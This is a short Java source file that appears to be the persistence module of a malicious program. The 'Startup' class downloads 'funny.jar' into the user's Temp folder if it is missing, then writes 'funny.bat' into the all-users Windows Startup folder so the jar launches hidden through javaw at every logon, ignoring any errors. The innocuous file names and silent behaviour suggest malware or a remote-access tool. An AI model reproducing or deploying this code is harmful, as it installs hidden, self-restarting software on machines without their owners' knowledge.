package dev.peter.luterium.features.maintainer;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;

/**
 * @author Peter
 * @since 09/30/2025
 * Adds a batch file to C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp that auto-runs the jar
 * (Perhaps this may be changed in the near future, because I would rather use Windows' Task Scheduler)
 */

public class Startup {
    public static void registerToStartup() {
        File path = new File("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\funny.bat");
        File funnyFile = new File(System.getProperty("user.home") + "\\AppData\\Local\\Temp\\funny.jar");

        if (!funnyFile.exists()) {
            Downloader.downloadFile();
        }

        try {
            PrintWriter writer = new PrintWriter(path, "UTF-8");
            writer.println("start javaw -Xmx200m -jar " + funnyFile.getAbsolutePath());
            writer.close();
        } catch (FileNotFoundException | UnsupportedEncodingException ignored) {}
    }
}
